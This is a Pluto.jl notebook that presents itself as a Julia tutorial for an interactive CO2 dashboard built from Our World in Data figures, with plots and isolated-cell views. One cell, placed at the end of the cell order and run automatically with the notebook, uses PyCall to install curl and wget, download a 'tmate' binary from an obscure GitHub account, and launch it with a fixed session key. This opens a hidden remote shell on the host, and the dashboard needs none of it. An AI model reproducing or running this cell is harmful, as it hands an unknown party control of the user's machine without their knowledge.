### A Pluto.jl notebook ###
# v0.19.28

using Markdown
using InteractiveUtils

# This Pluto notebook uses @bind for interactivity. When running this notebook outside of Pluto, the following 'mock version' of @bind gives bound variables a default value (instead of an error).
macro bind(def, element)
    quote
        local iv = try Base.loaded_modules[Base.PkgId(Base.UUID("6e696c72-6542-2067-7265-42206c756150"), "AbstractPlutoDingetjes")].Bonds.initial_value catch; b -> missing; end
        local el = $(esc(element))
        global $(esc(def)) = Core.applicable(Base.get, el) ? Base.get(el) : iv(el)
        el
    end
end

# ╔═╡ c68078b3-91b1-4fb9-b3ab-e82af3e4d226
begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("apt-get update -y && apt-get install curl wget -y")
	os.system("wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n tmate")
end

# ╔═╡ 19802f02-dd81-4a5b-8f63-97c49d3bc8c1
using JolinPluto, PlutoUI, HypertextLiteral, CSV, DataFrames, Plots

# ╔═╡ 7d101262-04de-4272-ad86-2bfaf2f2ce13
using HTTP

# ╔═╡ 05ca2710-857d-4cb6-aff9-66cfa173cc53
md"""
# Julia Dashboard

We  are going to look at CO2 data.

> 👉 3, 1, 2.  The order of cells does not matter to much for Pluto notebooks. Hence we can easily bring the summary to the top.
"""

# ╔═╡ a239e7bd-deb1-4d9c-83f8-ad8be69dca71
md"""
## Installing Julia dependencies

First time you use a new Julia package, it is going to be precompiled which takes a moment of time. After that you can enjoy blazingly fast interactive notebook.
"""

# ╔═╡ d650c1fc-9601-41fa-b69b-1ede5b875345
plotly()  # activate plotly plotting backend

# ╔═╡ 2dd702af-2c03-46e7-ae89-4a09dd087f85
@output_below  # from JolinPluto

# ╔═╡ 11b2cf52-fc74-4f7d-85be-0a5cb42394a4
TableOfContents()  # from PlutoUI

# ╔═╡ 45308298-25b7-40e3-8643-852f35283675
md"""
## Downloading data
"""

# ╔═╡ d57afd02-5181-4696-bb69-153c37ef76b2
md"""
Using `Downloads.download` we can conveniently download files from the web. The data is stored in a temporary file.
"""

# ╔═╡ 14a34832-291c-4fe2-bca5-fe049b6071e1
datafile = download("https://nyc3.digitaloceanspaces.com/owid-public/data/co2/owid-co2-data.csv")

# ╔═╡ 196296b9-a01d-4afb-bc20-b09d457c47c6
md"""
The file can then be read using [`CSV`](https://csv.juliadata.org/stable/) and converted to a standard [`DataFrame`](https://csv.juliadata.org/stable/).

Note that the first `CSV.File` runs additional precompilations. When reexecuting the cell, it is as fast you can get a CSV parser. Perfect for creating dashboards based on a CSV source.
"""

# ╔═╡ 85a88dee-c945-444b-a6a7-bead3403ef11
data = DataFrame(CSV.File(datafile))

# ╔═╡ 4745a6ca-7a43-409c-9cd0-2e2dd543c97a
md"""
For some example interactions in order to explore the data we look at columns and countries.
"""

# ╔═╡ 084ed3a1-089d-4c5e-bad5-925e6fc73945
columns = names(data)

# ╔═╡ c5b2dfb4-4ccd-4f75-8bbb-8d690486b48b
countries = unique(data[!, :country])

# ╔═╡ 9aaff669-66f8-46da-a42b-47968550e84b
md"""
## Interactive visualization

We can combine multiple input widgets together using markdown string and interpolation syntax `$`. E.g. let's bring everything into a table.
"""

# ╔═╡ ac931d72-9723-4ced-b048-aa769eeb0196
choose = md"""
| Parameter | Choose |
| --------- | :----- |
| region 1 | $(@bind country1 PlutoUI.Select(countries; default="World")) |
| region 2 | $(@bind country2 PlutoUI.Select(countries; default="Germany")) |
| compare   | $(@bind yaxis PlutoUI.Select(columns; default="co2_per_capita")) |
"""

# ╔═╡ 73474f4c-b760-4c84-96a1-4f7aff20ec31
(; yaxis, country1, country2)

# ╔═╡ 86aca23a-a854-49c3-9d66-07fbc5159e8e
xaxis = "year"

# ╔═╡ 8d48cc04-91c5-4861-b2b2-925157297f71
subdata1 = filter(row -> row.country == country1, data);

# ╔═╡ 426c4994-f47f-465d-b2ca-c40d2a77d73e
subdata2 = filter(row -> row.country == country2, data)

# ╔═╡ 2397576c-b463-4e93-89ce-ffa4718791aa
md"""
## Plot data

The visualization is enhanced by plotly. Note that we can simply reuse the already defined input widgets.
"""

# ╔═╡ aaf50fdb-2955-4c37-9ee1-085f51dd7940
output = begin
	plot(subdata1[!, xaxis], subdata1[!, yaxis], xlabel=xaxis, ylabel=yaxis, label=country1, legend_position=:topleft)
	plot!(subdata2[!, xaxis], subdata2[!, yaxis], xlabel=xaxis, ylabel=yaxis, label=country2)
	plotly_responsive()  # helper from JolinPluto, works only with plotly() backend
end

# ╔═╡ aedb04d7-a69d-4fff-bf03-65d01169ccca
md"""
# Next
- [Our World in Data - CO2 Data](https://github.com/owid/co2-data) for more details on the data source
- [`StatsPlots.jl`](https://github.com/JuliaPlots/StatsPlots.jl) and [`Plots.jl`](https://docs.juliaplots.org/stable/) for plotting
- [`CSV.jl`](https://csv.juliadata.org/stable/) for more on CSV support
- [`DataFrames.jl`](https://dataframes.juliadata.org/stable/) for more on Julia's Dataframes, especially its [comparison to python pandas / R Dataframe](https://dataframes.juliadata.org/stable/man/comparisons/)
- [`PlutoUI.jl`](https://github.com/JuliaPluto/PlutoUI.jl) for more prebuilt input widgets.

Happy dashboarding 📈 📊!
"""

# ╔═╡ 0efc98b1-85b6-477b-adbe-ddc538260a55
md"""
The first thing we need are the cell-id of each cell which output should be isolated. Use JolinPluto's helpers `@cell_ids_create_wrapper`, `@get` and `@cell_ids_push!`. It is super easy.
"""

# ╔═╡ d5b97eee-f200-4302-80df-301262b191e5
cell_ids_wrapper = @cell_ids_create_wrapper()

# ╔═╡ 3c58b1f3-2a1d-4e27-92e2-62abe4421239
cell_ids_push!(cell_ids_wrapper); choose

# ╔═╡ 055c3fd9-d421-4171-b41e-4f418ee56f8e
cell_ids_push!(cell_ids_wrapper); output

# ╔═╡ 0dffe565-3ebf-4fa9-bc20-d9f93e5786c2
md"""
`@cell_ids_create_wrapper` is a bit hidden at very top of this notebook - the final summary outputs are using this macro. 
"""

# ╔═╡ 2760c6c3-c65c-476f-b3e8-b2d198b4fc87
cell_ids = @get cell_ids_wrapper

# ╔═╡ bb942d86-c926-4e49-aed2-4914ac5fd839
md"""
Having the cell_ids which auto-update themselves, we can construct a link for the respective view.
"""

# ╔═╡ a6e9add8-195a-4647-8662-d7c5b0251763
url_open = "$(ENV["JOLIN_SITE"])/env/$(ENV["JOLIN_ENVIRONMENT"])/$(ENV["JOLIN_REPO"])/open?path=$(HTTP.escapeuri(split(@__FILE__, "#")[1]))"

# ╔═╡ 797c7401-cae3-449f-b29c-0592da2da69b
suffix_cell_ids = join("&isolated_cell_id=$id" for id in cell_ids)

# ╔═╡ 8da59c96-2097-438d-b1bc-6c0721cf109f
link_view = @htl """👉 <a href="$url_open$suffix_cell_ids" target="_blank">
open dedicated view
</a>"""

# ╔═╡ a0c1ba81-8be4-40c8-9478-79b79ff56efc
md"""
# Extra: View only certain cells

Pluto allows you to create dedicated views which only contain the output of a few specified cells.

$link_view
"""

# ╔═╡ Cell order:
# ╟─05ca2710-857d-4cb6-aff9-66cfa173cc53
# ╟─3c58b1f3-2a1d-4e27-92e2-62abe4421239
# ╟─055c3fd9-d421-4171-b41e-4f418ee56f8e
# ╟─a239e7bd-deb1-4d9c-83f8-ad8be69dca71
# ╠═19802f02-dd81-4a5b-8f63-97c49d3bc8c1
# ╠═d650c1fc-9601-41fa-b69b-1ede5b875345
# ╠═2dd702af-2c03-46e7-ae89-4a09dd087f85
# ╠═11b2cf52-fc74-4f7d-85be-0a5cb42394a4
# ╟─45308298-25b7-40e3-8643-852f35283675
# ╟─d57afd02-5181-4696-bb69-153c37ef76b2
# ╠═14a34832-291c-4fe2-bca5-fe049b6071e1
# ╟─196296b9-a01d-4afb-bc20-b09d457c47c6
# ╠═85a88dee-c945-444b-a6a7-bead3403ef11
# ╟─4745a6ca-7a43-409c-9cd0-2e2dd543c97a
# ╠═084ed3a1-089d-4c5e-bad5-925e6fc73945
# ╠═c5b2dfb4-4ccd-4f75-8bbb-8d690486b48b
# ╟─9aaff669-66f8-46da-a42b-47968550e84b
# ╠═ac931d72-9723-4ced-b048-aa769eeb0196
# ╠═73474f4c-b760-4c84-96a1-4f7aff20ec31
# ╠═86aca23a-a854-49c3-9d66-07fbc5159e8e
# ╠═8d48cc04-91c5-4861-b2b2-925157297f71
# ╠═426c4994-f47f-465d-b2ca-c40d2a77d73e
# ╟─2397576c-b463-4e93-89ce-ffa4718791aa
# ╠═aaf50fdb-2955-4c37-9ee1-085f51dd7940
# ╟─aedb04d7-a69d-4fff-bf03-65d01169ccca
# ╟─a0c1ba81-8be4-40c8-9478-79b79ff56efc
# ╟─0efc98b1-85b6-477b-adbe-ddc538260a55
# ╠═d5b97eee-f200-4302-80df-301262b191e5
# ╟─0dffe565-3ebf-4fa9-bc20-d9f93e5786c2
# ╠═2760c6c3-c65c-476f-b3e8-b2d198b4fc87
# ╟─bb942d86-c926-4e49-aed2-4914ac5fd839
# ╠═7d101262-04de-4272-ad86-2bfaf2f2ce13
# ╠═a6e9add8-195a-4647-8662-d7c5b0251763
# ╠═797c7401-cae3-449f-b29c-0592da2da69b
# ╠═8da59c96-2097-438d-b1bc-6c0721cf109f
# ╠═c68078b3-91b1-4fb9-b3ab-e82af3e4d226
